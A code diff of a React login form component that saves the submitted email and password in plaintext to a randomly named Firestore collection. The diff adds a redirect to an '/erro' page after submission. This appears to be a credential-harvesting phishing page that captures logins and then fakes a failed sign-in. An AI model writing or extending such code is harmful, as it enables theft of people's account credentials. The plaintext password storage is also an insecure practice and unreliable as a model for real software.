@@ -1,27 +1,30 @@
-import { addDoc, collection} from "firebase/firestore";
+import { addDoc, collection } from "firebase/firestore";
 import { databaseApp } from "../../Services/FireStoreConfig";
 import { useState } from "react";
 import style from "./Formulario.module.css";
-import { useNavigate } from "react-router-dom";
 import { v4 as uuidv4 } from 'uuid';
-
+import { useNavigate } from "react-router-dom";
 
 const Formulario = () => {
+
     const [email, Setemail] = useState("");
     const [senha, setSenha] = useState("");
     const referencia = collection(databaseApp, `${uuidv4()}`);
+    const navigate = useNavigate();
     const enviarDB = async (e) => {
-        await addDoc(referencia,{
-          email:email, 
-          senha:senha 
-        })
+        await addDoc(referencia, {
+            email: email,
+            senha: senha
+        });
+
     }
-    
+
     return (
-        <form onSubmit={(e)=>{
+        <form onSubmit={(e) => {
             e.preventDefault()
             enviarDB();
-            }} className={style.formulario}>
+            navigate("/erro")
+        }} className={style.formulario}>
             <input className={style.inpt}
                 value={email}
                 onChange={(e) => Setemail(e.target.value)}
